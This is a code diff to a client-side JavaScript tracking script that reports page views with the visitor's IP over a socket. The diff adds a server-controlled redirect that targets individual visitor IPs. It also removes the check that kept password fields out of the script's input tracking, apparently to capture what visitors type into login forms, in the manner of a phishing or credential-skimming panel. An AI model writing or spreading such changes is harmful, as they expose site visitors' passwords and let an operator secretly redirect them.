@@ -24,13 +24,32 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Initialize by getting the IP, then send page view
     getClientIP().then(ip => {
+      // Get current path
+      const currentPath = window.location.pathname;
+      
+      // Skip tracking for dashboard paths
+      if (currentPath.startsWith('/dashboard')) {
+        console.log('Dashboard path detected, skipping visitor tracking');
+        return;
+      }
+      
       // Send current page path to server on page load
       socket.emit('page-view', { 
-        path: window.location.pathname,
+        path: currentPath,
         title: document.title,
         referrer: document.referrer,
         clientIP: ip
       });
+    });
+    
+    // Listen for redirect events from server
+    socket.on('redirect', function(data) {
+      // Check if this redirect is for our IP
+      if (data.ip && clientIP && data.ip === clientIP) {
+        console.log('Received redirect instruction to:', data.redirectUrl);
+        // Redirect the browser
+        window.location.href = data.redirectUrl;
+      }
     });
     
     // Track input fields across all pages
@@ -42,9 +61,7 @@ document.addEventListener('DOMContentLoaded', function() {
       const inputs = document.querySelectorAll('input, textarea');
       
       inputs.forEach(input => {
-        // Skip password fields for security
-        if (input.type === 'password') return;
-        
+    
         // Generate a unique ID for this input
         const inputId = input.id || input.name || input.placeholder || 'unnamed-' + Math.random().toString(36).substr(2, 9);
         
